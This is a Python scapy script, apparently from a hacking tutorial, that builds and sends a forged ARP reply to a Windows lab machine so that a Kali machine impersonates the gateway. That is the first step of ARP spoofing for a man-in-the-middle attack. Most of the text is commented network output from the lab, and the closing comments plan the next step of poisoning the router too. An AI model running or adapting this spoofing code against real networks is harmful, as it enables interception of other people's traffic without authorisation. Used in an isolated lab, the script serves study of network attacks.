
#!/usr/bin/env python
import scapy.all as scapy
from scapy import *

# Here we are going to create an arp packet
#1 if op=2 means we are going to create arp response. op=1 is default and corresponds to arp request
#2 pdst is the ip of target machine. in our case it is windows machine in vmware . This windows machine is connected to same network as kali machine
# to get ip we can use network scanner which we used earlier: network_scanner1_allinsubnet.py
# root@kali:~/Desktop/python_program# python network_scanner.py
# Begin emission:
# Finished sending 256 packets.
# ****
# Received 4 packets, got 4 answers, remaining 252 packets
#   00:50:56:c0:00:08 unknown 192.168.177.1
#   00:50:56:ff:83:b9 unknown 192.168.177.2
#   00:0c:29:dc:63:18 unknown 192.168.177.133
#   00:50:56:f7:a3:83 unknown 192.168.177.254

# root@kali:~/Desktop/python_program# route -n
# Kernel IP routing table
# Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
# 0.0.0.0         192.168.177.2   0.0.0.0         UG    100    0        0 eth0
# 192.168.177.0   0.0.0.0         255.255.255.0   U     100    0        0 eth0
# root@kali:~/Desktop/python_program# ipconfig
# Command 'ipconfig' not found, did you mean:
#   command 'iwconfig' from deb wireless-tools
#   command 'hipconfig' from deb hipcc
#   command 'iconfig' from deb ipmiutil
#   command 'ifconfig' from deb net-tools
# Try: apt install <deb name>
# root@kali:~/Desktop/python_program# ifconfig
# eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
#         inet 192.168.177.132  netmask 255.255.255.0  broadcast 192.168.177.255
#         inet6 fe80::20c:29ff:feac:9451  prefixlen 64  scopeid 0x20<link>
#         ether 00:0c:29:ac:94:51  txqueuelen 1000  (Ethernet)
#         RX packets 32  bytes 3098 (3.0 KiB)
#         RX errors 0  dropped 0  overruns 0  frame 0
#         TX packets 314  bytes 19513 (19.0 KiB)
#         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
#         device interrupt 19  base 0x2000
#
# lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
#         inet 127.0.0.1  netmask 255.0.0.0
#         inet6 ::1  prefixlen 128  scopeid 0x10<host>
#         loop  txqueuelen 1000  (Local Loopback)
#         RX packets 24  bytes 1440 (1.4 KiB)
#         RX errors 0  dropped 0  overruns 0  frame 0
#         TX packets 24  bytes 1440 (1.4 KiB)
#         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
#
# root@kali:~/Desktop/python_program#


#3 target mac of windows machine we can get it via program we had
#4 source where this packet is coming from: we will forge or provide false information here, we will tell windows as if it is coming from router, but we will be router ip here
##THus an ARP packet is created and stored in variable
##THus we have wrongly set ip of router with mac address of kali machine. so windows will believe kali machine as router
packet = scapy.ARP(op=2, pdst="192.168.177.133" , hwdst="00-0C-29-DC-63-18", psrc="192.168.177.2")
packet.show()
packet.summary()
##before we send arp table of target machine is
# C:\Users\IEUser>arp -a
#
# Interface: 192.168.177.133 --- 0x4
#   Internet Address      Physical Address      Type
#   192.168.177.2         00-50-56-ff-83-b9     dynamic
#   192.168.177.254       00-50-56-f7-a3-83     dynamic
#   192.168.177.255       ff-ff-ff-ff-ff-ff     static
#   224.0.0.22            01-00-5e-00-00-16     static
#   224.0.0.251           01-00-5e-00-00-fb     static
#   224.0.0.252           01-00-5e-00-00-fc     static
#   239.255.255.250       01-00-5e-7f-ff-fa     static
#   255.255.255.255       ff-ff-ff-ff-ff-ff     static


# root@kali:~/Downloads/python_program# ifconfig eth0
# eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
#         inet 192.168.177.132  netmask 255.255.255.0  broadcast 192.168.177.255
#         inet6 fe80::20c:29ff:feac:9451  prefixlen 64  scopeid 0x20<link>
#         ether 00:0c:29:ac:94:51  txqueuelen 1000  (Ethernet)
#         RX packets 241  bytes 61659 (60.2 KiB)
#         RX errors 0  dropped 0  overruns 0  frame 0
#         TX packets 678  bytes 38438 (37.5 KiB)
#         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
#         device interrupt 19  base 0x2000

scapy.sendp(packet)
#after running we can see mac address of router changed to: which is mac address of kali machine
# in our machine it is not accepting send method and if we use sendp(), mac address of router does not get changed for windows machine in arp table for some reason , but ideally it should be changed with mac address of kali machin

#4 so far we made windows target machine to believe that kali machine is the router
# as next step we should make router believe that kali machine is the windows machine